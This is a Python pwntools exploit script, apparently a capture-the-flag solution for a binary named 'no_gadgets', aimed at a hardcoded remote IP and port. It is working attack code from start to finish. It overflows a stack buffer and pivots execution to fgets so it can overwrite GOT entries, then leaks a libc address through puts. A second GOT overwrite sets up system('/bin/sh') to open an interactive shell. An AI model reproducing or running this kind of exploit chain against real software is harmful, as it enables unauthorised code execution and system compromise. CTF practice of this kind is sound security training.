#!/usr/bin/python3

from pwn import *

exe = ELF('no_gadgets_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x401275

        c
        ''')
        input()


if args.REMOTE:
    p = remote('94.237.53.169', 48885)
else:
    p = process(exe.path)
GDB()
pop_rbp = 0x000000000040115d
fgets = 0x40121B
pa = b'\0'.ljust(136) + flat(pop_rbp, 0x404000+0x80, fgets)
sla(b'Data: ', pa)
# sl(pa)
got = flat(
    0x401036,  # put
    exe.symbols['main'] + 122,  # 0x401046, #strlen
    0x401056,  # printf
    0x401066,  # fgets
    0x401076,  # setvbuf
    exe.sym['main'] + 68,  # 0x404086, #exit
)
sl(got)
p.recvuntil(b'scratch!\n')
libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts
info("libc.address: " + hex(libc.address))
got = flat(
    '/bin/sh\0',  # put
    libc.sym.system
)
sl(got)
# sl(p64(plt.))
p.interactive()
